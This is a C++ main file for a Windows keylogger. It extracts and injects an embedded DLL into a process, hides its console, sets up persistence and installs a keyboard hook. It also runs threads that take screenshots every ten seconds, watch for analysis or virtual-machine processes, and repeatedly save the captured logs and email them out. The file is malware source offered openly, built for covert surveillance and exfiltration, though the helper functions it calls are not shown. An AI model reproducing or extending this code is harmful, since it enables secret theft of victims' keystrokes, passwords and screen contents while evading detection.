#include <iostream>
#include <windows.h>
#include <thread>
#include "../include/key_hook.h"
#include "../include/Screenshot.h"
#include "../include/anti_eyes.h"
#include "../include/stealth.h"
#include "../include/memory.h"
#include "../include/inject.h"


// Thread function for capturing screenshots
DWORD WINAPI screenshot_thread(LPVOID lpParam) {
    WCHAR filePath[] = L"C:\\Users\\kolby\\source\\repos\\KolbySnider\\Keylogger2\\out\\build\\x64-release\\screenshot.bmp";

    while (true) {
        save_bitmap(filePath); // Capture and save the screenshot
        Sleep(10000);         // Sleep for 10 seconds (10000 milliseconds)
    }

    return 0;
}

DWORD WINAPI detect_process_thread(LPVOID lpParam) {
    while (true) {
        detect_process(NULL);
        Sleep(10000);
    }
}

DWORD WINAPI email_thread(LPVOID lpParam) {
    while (true) {
        // Send email every 5 minutes (300000 milliseconds)
        Sleep(10000);
        save_logs_to_file();
        send_email();
    }
    return 0;
}

int main() {
    std::string dllPath = extract_embedded_dll();
    DWORD pid = get_process_id_by_name(L"key_logger");
    if (pid != 0) inject_dll(pid, dllPath.c_str());

    hide_console();
    persistence();

    install_hook(); // Install the key hook


    HANDLE hEmailThread = CreateThread(
        NULL, // default security attributes
        0, // default stack size
        email_thread, // thread function for email
        NULL, // argument to thread function
        0, // default creation flags
        NULL); // returns the thread identifier

    if (hEmailThread == NULL) {
        std::cerr << "Failed to create email thread." << std::endl;
        return 1;
    }

    HANDLE hScreenshotThread = CreateThread(
        NULL,            // default security attributes
        0,               // default stack size
        screenshot_thread, // thread function for screenshots
        NULL,            // argument to thread function
        0,               // default creation flags
        NULL);           // returns the thread identifier

    if (hScreenshotThread == NULL) {
        std::cerr << "Failed to create screenshot thread." << std::endl;
        return 1;
    }

    HANDLE hdetectProcessThread = CreateThread(
        NULL, // default security attributes
        0, // default stack size
        detect_process_thread, // thread function for screenshots
        NULL, // argument to thread function
        0, // default creation flags
        NULL); // returns the thread identifier


    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Clean up the hooks and threads
    uninstall_hook();
    WaitForSingleObject(hScreenshotThread, INFINITE); // Ensure screenshot thread finishes
    WaitForSingleObject(hdetectProcessThread, INFINITE); // Ensure Anti-VM thread finishes
    WaitForSingleObject(hEmailThread, INFINITE);

    // Close thread handles
    CloseHandle(hScreenshotThread);
    CloseHandle(hdetectProcessThread);
    CloseHandle(hEmailThread);

    return 0;
}
